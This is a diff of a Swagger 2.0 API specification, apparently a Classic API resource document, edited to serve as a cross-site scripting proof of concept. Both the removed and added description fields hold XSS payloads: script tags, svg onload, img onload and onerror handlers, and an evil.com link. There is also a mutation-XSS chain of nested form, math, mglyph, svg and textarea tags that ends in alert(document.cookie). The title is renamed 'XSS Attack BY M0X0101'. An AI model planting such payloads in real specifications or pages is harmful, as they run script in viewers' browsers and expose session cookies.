@@ -1,8 +1,9 @@
 swagger: '2.0'
 info:
-  title: Classic API Resource Documentation
-  description:  <script>alert(1)</script>
- <svg onload=confirm(1)> <img src='https://raw.githubusercontent.com/Cosmess/pocs_payloads/main/poc_cosmess.png' onload='alert(1)'> <a href='https://evil.com' onclick='alert(1)'>> CLICK HERE</a >
+  title: XSS Attack BY M0X0101
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+
   version: production
 basePath: /JSSResource/
 produces:
@@ -14,20 +15,20 @@ consumes:
 security:
   - basicAuth: []
 paths:
-  /accounts:
+  /M0X0101:
     get:
       responses:
         '200':
           description: No response was specified
       tags:
-        - accounts
+        - M0X0101_XSS_D
       operationId: findAccounts
       summary: Finds all accounts
   '/accounts/groupid/{id}':
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
 
           format: int64
           in: path
